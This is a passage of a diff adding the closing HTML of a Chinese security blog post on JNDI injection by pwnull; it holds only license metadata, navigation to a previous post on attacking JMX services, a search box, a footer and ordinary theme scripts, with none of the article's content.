+      <div>当我们谈论JNDI注入时，我们在谈论什么</div>
+      <div>https://pwnull.github.io/2022/jndi-injection-history/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pwnull</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月5日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/How-to-attack-RMI-based-JMX-services/" title="Attack JMX Service的打开方式">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Attack JMX Service的打开方式</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      @pwnull
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
